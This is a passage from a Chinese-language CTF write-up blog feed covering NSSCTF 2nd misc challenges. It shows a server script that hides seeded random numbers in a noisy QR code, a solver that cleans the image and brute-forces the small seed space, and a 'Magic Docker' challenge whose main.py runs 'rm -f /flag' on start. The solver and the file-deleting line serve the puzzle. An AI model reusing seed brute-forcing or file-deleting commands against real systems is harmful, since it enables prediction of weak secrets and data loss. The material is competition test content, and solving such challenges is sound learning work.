[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    reveal.append(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>)))<br>target = getrandbits(<span class="hljs-number">8</span>)<br>reveal = <span class="hljs-string">&quot;,&quot;</span>.join(reveal)<br><br>img_qrcode = qrcode.make(reveal)<br>img_qrcode = img_qrcode.crop((<span class="hljs-number">35</span>, <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">0</span>] - <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">1</span>] - <span class="hljs-number">35</span>))<br><br>offset, delta, rate = <span class="hljs-number">50</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span><br>img_qrcode = img_qrcode.resize(<br>    (<span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">0</span>] / rate), <span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">1</span>] / rate)), Image.LANCZOS<br>)<br>img_out = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img_qrcode.size)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">0</span>]):<br>        pixel_qrcode = img_qrcode.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel_qrcode == <span class="hljs-number">255</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                ),<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                ),<br>            )<br><br>img_out.save(<span class="hljs-string">&quot;qrcode.png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qrcode.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This my gift:&quot;</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(data).decode(), <span class="hljs-string">&quot;\n&quot;</span>)<br><br>ans = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your answer:&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-built_in">str</span>(target):<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No no no!&quot;</span>)<br></code></pre></td></tr></table></figure><p>题目大致思路：server端给出一个经过像素扰动的qrcode（范围<code>offset, delta, rate = 50, 3, 5</code>）的base64码，这个qrcode扫出来是一个有20个数字的数组，这些数字是由seed随机产生的，服务端接收1个数字，如果这个数字是qrcode里的数组中的第21个，则输出flag</p><p>思路不是很难，因为<code>secret_seed = randrange(1, 1000)</code>，产生随机数的seed给了范围，所以可以爆破第21个数字。主要难点在于像素扰动扫码以及爆破数字</p><p>学习一下wp，使用np.where还原，pyzbar识别二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> pyzbar <span class="hljs-keyword">import</span> pyzbar<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits, seed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTarget</span>(<span class="hljs-params">rec</span>):<br>    <span class="hljs-comment"># 1.读取二维码</span><br>    img_bytes = base64.b64decode(rec)<br>    img_array = np.frombuffer(img_bytes, np.uint8)<br>    img = cv2.imdecode(img_array, cv2.IMREAD_GRAYSCALE)<br><br>    <span class="hljs-comment"># 2.还原二维码</span><br>    img = np.where(img &lt; <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    <span class="hljs-comment"># cv2.imshow(&quot;img&quot;, img.astype(np.uint8))</span><br><br>    <span class="hljs-comment"># 3.扫描二维码解析</span><br>    lis = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, pyzbar.decode(img)[<span class="hljs-number">0</span>].data.decode().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(lis)<br><br>    <span class="hljs-comment"># 4.爆破Target</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        seed(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(getrandbits(<span class="hljs-number">8</span>) == lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rec = <span class="hljs-string">b&#x27;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&#x27;</span><br>    target = getTarget(rec)<br>    <span class="hljs-built_in">print</span>(target)<br><span class="hljs-comment">#[227, 19, 102, 10, 150, 150, 220, 227, 58, 162, 132, 38, 149, 137, 242, 205, 8, 7, 17, 200]</span><br><span class="hljs-comment">#81</span><br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686846.png)</p><h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><p><code>docker run randark/nssctf-round15-magic-docker</code></p><p>pull下来后提示need secret</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686847.png)</p><p>bash进入就行</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686848.png)</p><p>&#x2F;app下有main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> click<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-meta">@click.command()</span><br><span class="hljs-meta">@click.option(<span class="hljs-params"><span class="hljs-string">&#x27;--secret&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">secret</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(secret)==<span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;How dare you! &quot;</span>)<br><br>BANNER=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span><br><span class="hljs-string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span><br><span class="hljs-string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span><br><span class="hljs-string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span><br><span class="hljs-string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           </span><br><span class="hljs-string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span><br><span class="hljs-string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span><br><span class="hljs-string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span><br><span class="hljs-string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span><br><span class="hljs-string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span><br><span class="hljs-string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.system(<span class="hljs-string">&quot;rm -f /flag&quot;</span>)<br>    <span class="hljs-built_in">print</span>(BANNER)<br>    random.seed(<span class="hljs-string">&quot;NSSCTF 2nd&quot;</span>)<br>    answer=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need to give me the secret!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        func()<br></code></pre></td></tr></table></figure><p>可以看到启动docker后就会删掉flag，但是这前面func好像没什么用</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023*CTF</title>
    <link href="/2023/08/27/2023starCTF/"/>
    <url>/2023/08/27/2023starCTF/</url>
    
